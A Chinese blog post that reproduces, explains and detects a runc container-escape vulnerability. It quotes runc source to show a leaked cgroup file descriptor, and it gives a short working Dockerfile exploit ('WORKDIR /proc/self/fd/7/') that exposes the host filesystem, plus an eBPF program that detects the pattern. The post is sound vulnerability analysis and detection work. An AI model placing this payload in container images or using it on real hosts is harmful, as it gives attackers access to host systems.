<p>本来这篇文章应该在初一凌晨发的，但是拖延癌晚期，所以到现在才发，得反思下了</p><span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>众所周知，容器逃逸并不是什么令人稀奇的问题了（不被逃逸的容器才是稀奇），2月初，runc 社区正式公布了一个船新的逃逸 CVE，参见 <a href="https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv">https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv</a>，版本横跨 1.0 到 1.1.11</p><p>这个 CVE 的核心特性在于“可以通过镜像分发的方式，成本很低的进行逃逸”</p><p>我们先来复现一下这个问题</p><p>我自己的环境是这样</p><p><img src="https://github.com/Zheaoli/zheaoli.github.io/assets/7054676/635aadfa-4015-4424-a6d8-2ad1ca3b721b" alt="复现版本"></p><p>看这篇博客的同学可以参考下面方式进行环境准备，</p><ol><li>按照自己的发行版确保安装了，Docker, libseccomp, golang</li><li>按照下面方式进行环境安装</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/opencontainers/runc</span><br><span class="line"></span><br><span class="line">git checkout v1.1.0-rc.1</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">sudo <span class="built_in">rm</span> -rf $(<span class="built_in">which</span> runc)</span><br><span class="line"></span><br><span class="line">sudo make install</span><br><span class="line"></span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>然后我们可以准备这样一个 Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Sets the current working directory for this image</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /proc/self/fd/7/</span></span><br></pre></td></tr></table></figure><p>执行 <code>docker build . -t test</code></p><p>然后我们可以执行 <code>docker run --rm -ti test bash</code>，需要多次才能执行成功， 执行成功后我们进入容器 shell</p><p><img src="https://github.com/Zheaoli/zheaoli.github.io/assets/7054676/74756150-4e20-4028-9f4d-bd77aa326699" alt="容器内"></p><p>然后我们通过 <code>cd ../..</code> 退出到根目录，接着我们就能看到，我们宿主机完整的文件了。同时我们还能使用 chroot 能命令，切换到宿主机的根目录。</p><p><img src="https://github.com/Zheaoli/zheaoli.github.io/assets/7054676/d72cfe48-da4a-4a18-9f58-23e678d153e2" alt="逃逸行为"></p><p>那么这样一个问题是怎么导致的呢？</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>聊这个 CVE 之前，需要聊一些背景知识。首先是 Linux 下 openat2 这个 syscall。openat2 是 openat 在 Linux 5.6 之后的一个对于原本 open/openat 的一个扩展。其核心在于可以让用户进行更细粒度的控制，包括安全控制。比如 <code>O_CLOEXEC</code> （在执行 exec 时，自动更关闭之前的文件描述符）等细粒度的 flag 控制。</p><p>然后我们需要来聊聊整个容器的启动过程</p><p>容器启动的过程概述可以抽象为这样，</p><blockquote><p>docker-client -&gt; dockerd -&gt; containerd -&gt; containerd-shim -&gt; runc（容器外） -&gt; runc（容器内） -&gt; containter-entrypoint</p></blockquote><p>在启动过程中，runc 会负责设置容器的 cgroup 信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *initProcess)</span></span> start() (retErr <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> err := p.manager.Apply(p.pid()); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;unable to apply cgroup configuration: %w&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>众所周知，cgroup 最常见的控制方法是直接写入 cgroup 文件，runc 也不例外，同时为了保证文件的安全性，runc 会尝试使用 openat2 来进行文件打开。但是如前面所说的一样，openat2 是个在 Linux 5.6 之后才引入的 syscall，那么咋整捏，runc 有一个特殊方法 <code>prepareOpenat2</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prepareOpenat2</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line">prepOnce.Do(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">fd, err := unix.Openat2(<span class="number">-1</span>, cgroupfsDir, &amp;unix.OpenHow&#123;</span><br><span class="line">Flags: unix.O_DIRECTORY | unix.O_PATH,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">prepErr = &amp;os.PathError&#123;Op: <span class="string">&quot;openat2&quot;</span>, Path: cgroupfsDir, Err: err&#125;</span><br><span class="line"><span class="keyword">if</span> err != unix.ENOSYS &#123; <span class="comment">//nolint:errorlint // unix errors are bare</span></span><br><span class="line">logrus.Warnf(<span class="string">&quot;falling back to securejoin: %s&quot;</span>, prepErr)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">logrus.Debug(<span class="string">&quot;openat2 not available, falling back to securejoin&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> st unix.Statfs_t</span><br><span class="line"><span class="keyword">if</span> err = unix.Fstatfs(fd, &amp;st); err != <span class="literal">nil</span> &#123;</span><br><span class="line">prepErr = &amp;os.PathError&#123;Op: <span class="string">&quot;statfs&quot;</span>, Path: cgroupfsDir, Err: err&#125;</span><br><span class="line">logrus.Warnf(<span class="string">&quot;falling back to securejoin: %s&quot;</span>, prepErr)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cgroupFd = fd</span><br><span class="line"></span><br><span class="line">resolveFlags = unix.RESOLVE_BENEATH | unix.RESOLVE_NO_MAGICLINKS</span><br><span class="line"><span class="keyword">if</span> st.Type == unix.CGROUP2_SUPER_MAGIC &#123;</span><br><span class="line"><span class="comment">// cgroupv2 has a single mountpoint and no &quot;cpu,cpuacct&quot; symlinks</span></span><br><span class="line">resolveFlags |= unix.RESOLVE_NO_XDEV | unix.RESOLVE_NO_SYMLINKS</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> prepErr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>眼尖的同学已经看到了，在测试是否有 openat2 的时候，runc 会使用 <code>unix.Openat2(-1, cgroupfsDir, &amp;unix.OpenHow&#123;Flags: unix.O_DIRECTORY | unix.O_PATH&#125;)</code> 这个调用来测试是否有 openat2，在这里，我们没有使用 <code>O_CLOEXEC</code>，同时我已经打开的文件并没有被关闭， 这就导致了一个问题，如果系统支持 openat2，这里就会存在一个文件描述符泄漏（简单的给一个结论这里泄漏的文件描述符指向 <code>/sys/fs/cgroup</code>）</p><p>而利用方式也很简单，我们上面的样例 Dockerfile 中的 <code>WORKDIR /proc/self/fd/7/</code> 就是利用这个泄漏的文件描述符，WORKDIR 在 OCI 中会转化成 <code>CWD</code> 的设置，在 runc 启动过程中，将直接通过 chdir 的方式进行设置</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// before executing the command inside the namespace</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">finalizeNamespace</span><span class="params">(config *initConfig)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="comment">// Ensure that all unwanted fds we may have accidentally</span></span><br><span class="line"><span class="comment">// inherited are marked close-on-exec so they stay out of the</span></span><br><span class="line"><span class="comment">// container</span></span><br><span class="line"><span class="keyword">if</span> err := utils.CloseExecFrom(config.PassedFilesCount + <span class="number">3</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;error closing exec fds: %w&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// we only do chdir if it&#x27;s specified</span></span><br><span class="line">doChdir := config.Cwd != <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> doChdir &#123;</span><br><span class="line"><span class="comment">// First, attempt the chdir before setting up the user.</span></span><br><span class="line"><span class="comment">// This could allow us to access a directory that the user running runc can access</span></span><br><span class="line"><span class="comment">// but the container user cannot.</span></span><br><span class="line">err := unix.Chdir(config.Cwd)</span><br><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line"><span class="keyword">case</span> err == <span class="literal">nil</span>:</span><br><span class="line">doChdir = <span class="literal">false</span></span><br><span class="line"><span class="keyword">case</span> os.IsPermission(err):</span><br><span class="line"><span class="comment">// If we hit an EPERM, we should attempt again after setting up user.</span></span><br><span class="line"><span class="comment">// This will allow us to successfully chdir if the container user has access</span></span><br><span class="line"><span class="comment">// to the directory, but the user running runc does not.</span></span><br><span class="line"><span class="comment">// This is useful in cases where the cwd is also a volume that&#x27;s been chowned to the container user.</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;chdir to cwd (%q) set in config.json failed: %w&quot;</span>, config.Cwd, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么换句话说，我们容器内启动的进程默认的 <code>/proc/pid/cwd</code> 就是我们设置的 <code>/proc/self/fd/7</code> 也就是我们宿主机的 <code>/sys/fs/cgroup</code>，这就导致了我们在容器内可以直接访问宿主机的文件</p><p>这整个流程只能说，，阴差阳错</p><h2 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h2><p>如果我们 runc 版本没有办法及时更新到修复后的版本，那么我们有没有办法探测到这个问题呢？可以</p><p>这个攻击的特征非常简单</p><ol><li>使用 chdir 系统调用</li><li>目标路径是 <code>/proc/self/fd/*</code></li></ol><p>那么我们用 eBPF+Tracepoint 处理下就 OK</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmlinux.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bpf_tracing.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bpf_helpers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> __license[] SEC(<span class="string">&quot;license&quot;</span>) = <span class="string">&quot;Dual MIT/GPL&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> &#123;</span></span><br><span class="line">    __u32 pid;</span><br><span class="line">    __u8 path[<span class="number">256</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">unusedevent</span> __<span class="title">attribute__</span>((<span class="title">unused</span>));</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    __uint(type, BPF_MAP_TYPE_RINGBUF);</span><br><span class="line">__uint(max_entries, <span class="number">1</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">&#125; events <span class="title function_">SEC</span><span class="params">(<span class="string">&quot;.maps&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sys_enter_chdir_args</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> common_type;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> common_flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> common_preempt_count;</span><br><span class="line">    <span class="type">int</span> common_pid;</span><br><span class="line">    <span class="type">int</span> __syscall_nr;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *filename;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">SEC(<span class="string">&quot;tracepoint/syscalls/sys_enter_chdir&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">trace_enter_chdir</span><span class="params">(<span class="keyword">struct</span> sys_enter_chdir_args *ctx)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!ctx)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">event</span>;</span></span><br><span class="line">    event = bpf_ringbuf_reserve(&amp;events, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> event), <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!event) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    event-&gt;pid = bpf_get_current_pid_tgid()&gt;&gt;<span class="number">32</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *path = (<span class="type">const</span> <span class="type">char</span> *)ctx-&gt;filename;</span><br><span class="line">    bpf_probe_read_str(event-&gt;path, <span class="keyword">sizeof</span>(event-&gt;path), path);</span><br><span class="line">    bpf_ringbuf_submit(event, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将事件上报到用户态，然后用户态用正则处理下 path 就行。当然这里的特征还能更多样化一些</p><ol><li>unwind 一下拿到用户态调用栈，确定是 runc 的调用</li><li>确定下是否是容器进程等</li></ol><p>由于我比较懒，所以在博客里就不写了，有兴趣的同学可以自己写写（XD</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>也没啥好总结的，容器逃逸不是新闻，不逃逸才是（XD</p>